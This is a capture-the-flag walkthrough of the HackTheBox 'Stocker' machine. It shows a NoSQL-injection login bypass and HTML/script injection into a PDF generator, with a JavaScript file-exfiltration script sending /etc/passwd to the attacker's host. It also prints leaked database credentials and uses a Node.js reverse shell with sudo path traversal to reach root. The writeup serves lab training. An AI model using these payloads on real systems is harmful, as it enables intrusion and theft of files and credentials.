# Stocker - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![Stocker.JPG](images/Stocker.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22`, and `80`.

***User***: Discovered the virtual host `dev.stocker.htb` and successfully bypassed authentication using NoSQL injection. Located a PDF file created with `Skia/PDF m108` and successfully injected HTML into the generated PDF. Read the local file `index.js` by obtaining the password of the `angoose` user.

***Root***: Executed `sudo -l` and discovered the ability to run `/usr/bin/node /usr/local/scripts/*.js` as `root`. Utilized this by running a reverse shell with sudo `/usr/bin/node /usr/local/scripts/../../../tmp/rev.js`, successfully obtaining a reverse shell as `root`.

![pwn.JPG](images/pwn.JPG)


## Stocker Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/Stocker]
└──╼ $ nmap -sV -sC -oA nmap/Stocker 10.10.11.196
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-03 14:52 IST
Nmap scan report for 10.10.11.196
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Observing port `80` (http://stocker.htb), we see that the following web page is hosted:

![port80.JPG](images/port80.JPG)

Initiated a virtual host scan using the tool `gobuster`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Stocker]
└──╼ $ gobuster vhost -u stocker.htb -w ./subdomains-top1milion.txt -o vhosts -t 80
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://stocker.htb
[+] Method:       GET
[+] Threads:      80
[+] Wordlist:     ./subdomains-top1milion.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/03 14:58:22 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]

```

Discovered the virtual host `dev.stocker.htb` while scanning. Upon observing the URL http://dev.stocker.htb, the following web page was encountered:

![dev.JPG](images/dev.JPG)

By intercepting the login request, the following content was obtained:
```HTTP
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://dev.stocker.htb
DNT: 1
Connection: close
Cookie: connect.sid=s%3AtN-kXpz_f7SGn9BmNv4UXCAS9LlzwTFH.O%2F7ZQoR80qCnMZ%2FqU4sT8NFvVUBkTuLpV%2F5OuAKt6Jo
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

Response:
```HTTP
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 Feb 2023 13:22:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 92
Connection: close
X-Powered-By: Express
Location: /login?error=login-error
Vary: Accept


<p>Found. Redirecting to <a href="/login?error=login-error">/login?error=login-error</a></p>
```

The login page of the website was found to be vulnerable to NoSQL Injection as described in the source https://book.hacktricks.xyz/pentesting-web/nosql-injection.

To exploit this vulnerability, we need to change the `Content-Type` to `application/json` and send a following payload:
```HTTP
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/login
Content-Type: application/json
Content-Length: 54
Origin: http://dev.stocker.htb
DNT: 1
Connection: close
Cookie: connect.sid=s%3AtN-kXpz_f7SGn9BmNv4UXCAS9LlzwTFH.O%2F7ZQoR80qCnMZ%2FqU4sT8NFvVUBkTuLpV%2F5OuAKt6Jo
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null}}
```

The following response was received after sending the payload:
```HTTP
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 Feb 2023 13:56:17 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

![stock.JPG](images/stock.JPG)

Upon adding items to the cart, the following is observed:

![cart.JPG](images/cart.JPG)

Clicking on the `Submit Purchase` button results in the following:

![purchase.JPG](images/purchase.JPG)

This corresponds to the following HTTP request:
```HTTP
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 162
DNT: 1
Connection: close
Cookie: connect.sid=s%3A_C3kSkCujZj7USLqBfjWW5Yk1s__HyJt.NpaR9Big%2FUbENie5TrNkawmyz56AQRdEbjwbtmVjcec

{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "Cup",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

Clicking on the link `here` results in the download of the following PDF file:

![pdf.JPG](images/pdf.JPG)

Upon inspecting the PDF file with the tool `exiftool`, it was discovered that the file was created using `Skia/PDF m108`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Stocker]
└──╼ $ exiftool document.pdf 
ExifTool Version Number         : 12.16
File Name                       : document.pdf
Directory                       : .
File Size                       : 37 KiB
File Modification Date/Time     : 2023:02:03 16:45:50+02:00
File Access Date/Time           : 2023:02:03 16:45:50+02:00
File Inode Change Date/Time     : 2023:02:03 16:45:50+02:00
File Permissions                : rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:02:03 14:45:18+00:00
Modify Date                     : 2023:02:03 14:45:18+00:00
```

Our HTML code can be injected into this PDF file by using the following JSON payload:
```HTTP
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 227
DNT: 1
Connection: close
Cookie: connect.sid=s%3A_C3kSkCujZj7USLqBfjWW5Yk1s__HyJt.NpaR9Big%2FUbENie5TrNkawmyz56AQRdEbjwbtmVjcec

{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<iframe src='file:///etc/passwd' width='500' height='1060'></iframe>",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

By sending the payload, the following response was obtained:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 Feb 2023 12:43:43 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 53
Connection: close
X-Powered-By: Express
ETag: W/"35-qrQFK6xlPFMKT+7JQPQvpKDsH1s"

{"success":true,"orderId":"63dd8e1f9d443a3cead86ef1"}
```

By accessing the URL http://dev.stocker.htb/api/po/63dd8ef49d443a3cead86ef6, we were able to retrieve the content of the file `/etc/passwd`:

![pdf.JPG](images/pdf.JPG)

Using the [sendfile.js](./sendfile.js) script, we can read a local file on the server and send it as a base64 encoded string to our web server:
```javascript
async function sendFileContent(filePath) {
  // Load the file content
  var fileContent = await loadFile(filePath);

  // Encode the file content as base64
  var base64Content = btoa(fileContent);

  // Send the base64-encoded content to the server
  var response = await fetch(`http://10.10.14.14:8000/${base64Content}`);

  // Check the response status
  if (response.ok) {
    console.log("File content sent successfully");
  } else {
    console.error("Failed to send file content");
  }
}

async function loadFile(filePath) {
  return new Promise(function (resolve, reject) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", filePath, true);
    xhr.responseType = "text";
    xhr.onload = function () {
      if (xhr.readyState === xhr.DONE) {
        if (xhr.status === 200) {
          resolve(xhr.response);
        } else {
          reject(xhr.statusText);
        }
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText);
    };
    xhr.send();
  });
}

sendFileContent("/etc/passwd");
```

The following request can be sent to include the script:
```HTTP
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 227
DNT: 1
Connection: close
Cookie: connect.sid=s%3A_C3kSkCujZj7USLqBfjWW5Yk1s__HyJt.NpaR9Big%2FUbENie5TrNkawmyz56AQRdEbjwbtmVjcec

{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title":"<script src='http://10.10.14.14:8000/sendfile.js'></script>",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

And by analyzing the GET request, we can see that it is sending the base64 content of the local file `/etc/passwd`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Stocker]
└──╼ $ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.196 - - [04/Feb/2023 01:14:13] "GET /sendfile.js HTTP/1.1" 200 -
10.10.11.196 - - [04/Feb/2023 01:14:14] code 404, message File not found
10.10.11.196 - - [04/Feb/2023 01:14:14] "GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTI6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMzo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTY6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmZ3dXBkLXJlZnJlc2g6eDoxMTI6MTE5OmZ3dXBkLXJlZnJlc2ggdXNlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbW9uZ29kYjp4OjExMzo2NTUzNDo6L2hvbWUvbW9uZ29kYjovdXNyL3NiaW4vbm9sb2dpbgphbmdvb3NlOng6MTAwMToxMDAxOiwsLDovaG9tZS9hbmdvb3NlOi9iaW4vYmFzaApfbGF1cmVsOng6OTk4Ojk5ODo6L3Zhci9sb2cvbGF1cmVsOi9iaW4vZmFsc2UK HTTP/1.1" 404 -
```

By decoding the base64 content of the file, we get the contents of the `/etc/passwd` file:
```console
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We observe that the `angoose` user has a default shell of `/bin/bash`.

We can employ a similar approach to read the `/etc/nginx/nginx.conf` file and obtain its contents:
```console
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;

        server {
            listen 80;

            root /var/www/dev;
            index index.html index.htm index.nginx-debian.html;

            server_name dev.stocker.htb;

            location / {
                proxy_pass http://127.0.0.1:3000;
                proxy_http_version  1.1;
                proxy_cache_bypass  $http_upgrade;

                proxy_set_header Upgrade           $http_upgrade;
                proxy_set_header Connection        "upgrade";
                proxy_set_header Host              $host;
                proxy_set_header X-Real-IP         $remote_addr;
                proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
                proxy_set_header X-Forwarded-Host  $host;
                proxy_set_header X-Forwarded-Port  $server_port;
            }
        }
        
        server {
            listen 80;

            root /var/www/html;
            index index.html index.htm index.nginx-debian.html;

            server_name stocker.htb;

            location / {
                    try_files $uri $uri/ =404;
            }
        }

        server {
            listen 80 default;

            server_name _;

            location / {
                return 301 http://stocker.htb;
            }
        }

}
```

We can locate the `dev` virtual host at `/var/www/dev`, and read the contents of the `index.js` file located at `/var/www/dev/index.js`:
```javascript
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");

const app = express();
const port = 3000;

// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
  session({
    secret: randomBytes(32).toString("hex"),
    resave: false,
    saveUninitialized: true,
    store: MongoStore.create({
      mongoUrl: dbURI,
    }),
  })
);
app.use("/static", express.static(__dirname + "/assets"));

app.get("/", (req, res) => {
  return res.redirect("/login");
});

app.get("/api/products", async (req, res) => {
  if (!req.session.user) return res.json([]);

  const products = await mongoose.model("Product").find();
  return res.json(products);
});

app.get("/login", (req, res) => {
  if (req.session.user) return res.redirect("/stock");

  return res.sendFile(__dirname + "/templates/login.html");
});

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) return res.redirect("/login?error=login-error");

  // TODO: Implement hashing

  const user = await mongoose.model("User").findOne({ username, password });

  if (!user) return res.redirect("/login?error=login-error");

  req.session.user = user.id;

  console.log(req.session);

  return res.redirect("/stock");
});

app.post("/api/order", async (req, res) => {
  if (!req.session.user) return res.json({});

  if (!req.body.basket) return res.json({ success: false });

  const order = new mongoose.model("Order")({
    items: req.body.basket.map((item) => ({ title: item.title, price: item.price, amount: item.amount })),
  });
  await order.save();

  return res.json({ success: true, orderId: order._id });
});

app.get("/api/po/:id", async (req, res) => {
  const order = await mongoose.model("Order").findById(req.params.id);

  if (!order) return res.sendStatus(404);

  const htmlPath = `${__dirname}/pos/${req.params.id}.html`;
  const filePath = `${__dirname}/pos/${req.params.id}.pdf`;

  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  }

  fs.writeFileSync(htmlPath, formatHTML(order));

  await generatePDF(req.params.id);

  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  } else {
    return res.sendStatus(500);
  }
});

app.get("/stock", (req, res) => {
  if (!req.session.user) return res.redirect("/login?error=auth-required");

  return res.sendFile(__dirname + "/templates/index.html");
});

app.get("/logout", async (req, res) => {
  req.session.user = "";
  return res.redirect("/login");
});

app.listen(port, "127.0.0.1", async () => {
  await mongoose.connect(dbURI);

  // Setup Mongoose schema
  require("./schema.js");
  console.log(`Example app listening on port ${port}`);
});
```

We observe that the credentials to access the MongoDB database are present in the code, specifically `const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";`.

We have successfully utilized the password of the `dev` user (`IHeardPassphrasesArePrettySecure`) for the `angoose`user via SSH:
```console
┌─[evyatar9@parrot]─[/hackthebox/Stocker]
└──╼ $ ssh angoose@stocker.htb
The authenticity of host 'stocker.htb (10.10.11.196)' can't be established.
ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'stocker.htb,10.10.11.196' (ECDSA) to the list of known hosts.
angoose@stocker.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$  cat user.txt
9a820c5a1676a0c62f24137079a9ea1a
```

And we get the user flag `9a820c5a1676a0c62f24137079a9ea1a`.

### Root

By executing the command `sudo -l`, we can display the following information:
```console
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

As we can see, we have the ability to run scripts located in `/usr/local/scripts/*.js` as the `root` user.

To bypass this restriction, we can create a reverse shell in `/tmp` using the following code:
```console
angoose@stocker:/tmp$ cat rev.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.10.14.14", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

With the reverse shell created in `/tmp`, we can run the following command to execute our script:
```console
angoose@stocker:/tmp$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/rev.js
[sudo] password for angoose:
```

Note that we need to navigate three directories up to `/` before accessing `/tmp/rev.js`.

This will give us a reverse shell:
```console
┌─[evyatar9@parrot]─[/hackthebox/Stocker]
└──╼ $  nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from stocker.htb [10.10.11.196] 38802
whoami
root
cat /root/root.txt
379e3da522f4948d9aee336caa1b1734
```

And we get the root flag `379e3da522f4948d9aee336caa1b1734`.
